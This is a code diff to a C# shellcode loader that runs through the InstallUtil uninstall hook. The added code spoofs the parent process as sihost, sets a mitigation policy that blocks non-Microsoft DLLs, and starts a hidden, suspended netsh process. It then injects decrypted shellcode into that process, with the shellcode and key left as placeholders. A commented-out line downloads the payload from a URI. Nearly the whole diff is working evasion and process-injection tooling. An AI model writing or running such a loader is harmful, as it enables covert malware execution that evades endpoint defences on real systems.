@@ -7,10 +7,9 @@ using System.Runtime.InteropServices;
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
-    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
     public override void Uninstall(System.Collections.IDictionary savedState)
     {
-        Inject.Program.Run(new string[] { });
+        Inject.Program.Run();
     }
 }
 
@@ -55,11 +54,72 @@ namespace Inject
         static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
  uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool CloseHandle(IntPtr hHandle);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFO
+        {
+            public uint cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttributes;
+            public uint dwFlags;
+            public ushort wShowWindow;
+            public ushort cbReserved;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdErr;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFOEX
+        {
+            public STARTUPINFO StartupInfo;
+            public IntPtr lpAttributeList;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr lpSecurityDescriptor;
+            public int bInheritHandle;
+        }
         public static void Main(string[] args)
         {
 
         }
-        public static void Run(string[] args)
+        public static void Run()
         {
             IntPtr hCurrentProcess = OpenProcess(0x001F0FFF, false, Process.GetCurrentProcess().Id);
             IntPtr mem = VirtualAllocExNuma(hCurrentProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
@@ -67,8 +127,80 @@ namespace Inject
             {
                 return;
             }
-            int id = Process.GetProcessesByName("explorer")[0].Id;
-            IntPtr hTargetProcess = OpenProcess(0x001F0FFF, false, id);
+
+            var startInfoEx = new STARTUPINFOEX();
+            var processInfo = new PROCESS_INFORMATION();
+
+            startInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startInfoEx);
+
+            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
+
+            try
+            {
+                var processSecurity = new SECURITY_ATTRIBUTES();
+                var threadSecurity = new SECURITY_ATTRIBUTES();
+                processSecurity.nLength = Marshal.SizeOf(processSecurity);
+                threadSecurity.nLength = Marshal.SizeOf(threadSecurity);
+
+                var lpSize = IntPtr.Zero;
+                InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
+                startInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+                InitializeProcThreadAttributeList(startInfoEx.lpAttributeList, 2, 0, ref lpSize);
+
+                Marshal.WriteIntPtr(lpValue, new IntPtr((long)0x300000000000));
+
+                UpdateProcThreadAttribute(
+                    startInfoEx.lpAttributeList,
+                    0,
+                    (IntPtr)0x20007,
+                    lpValue,
+                    (IntPtr)IntPtr.Size,
+                    IntPtr.Zero,
+                    IntPtr.Zero
+                    );
+
+                var parentHandle = Process.GetProcessesByName("sihost")[0].Handle;
+                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
+                Marshal.WriteIntPtr(lpValue, parentHandle);
+
+                UpdateProcThreadAttribute(
+                    startInfoEx.lpAttributeList,
+                    0,
+                    (IntPtr)0x00020000,
+                    lpValue,
+                    (IntPtr)IntPtr.Size,
+                    IntPtr.Zero,
+                    IntPtr.Zero
+                    );
+
+                CreateProcess(
+                    null,
+                    "netsh",
+                    ref processSecurity,
+                    ref threadSecurity,
+                    false,
+                    (uint)(0x00000004 | 0x00080000 | 0x00000008),
+                    IntPtr.Zero,
+                    null,
+                    ref startInfoEx,
+                    out processInfo
+                    );
+            }
+            catch (Exception e)
+            {
+            }
+            finally
+            {
+                DeleteProcThreadAttributeList(startInfoEx.lpAttributeList);
+                Marshal.FreeHGlobal(startInfoEx.lpAttributeList);
+                Marshal.FreeHGlobal(lpValue);
+            }
+
+
+            IntPtr hTargetProcess = processInfo.hProcess;
+            //WebClient wc = new WebClient();
+
+            //byte[] buf = Convert.FromBase64String(wc.DownloadString(URI));
 
             byte[] buf = Convert.FromBase64String("##BASE64SHELLCODE##");
             byte[] key = Convert.FromBase64String("##BASE64KEY##");
@@ -121,11 +253,12 @@ namespace Inject
                 0,
                 0x20
                 );
-
             IntPtr hRemoteThread = IntPtr.Zero;
             IntPtr res2 = RtlCreateUserThread(hTargetProcess, IntPtr.Zero, false, 0,
                 IntPtr.Zero, IntPtr.Zero,
                 targetBaseAddress, IntPtr.Zero, ref hRemoteThread, IntPtr.Zero);
+            CloseHandle(processInfo.hProcess);
+            CloseHandle(processInfo.hThread);
         }
     }
 }
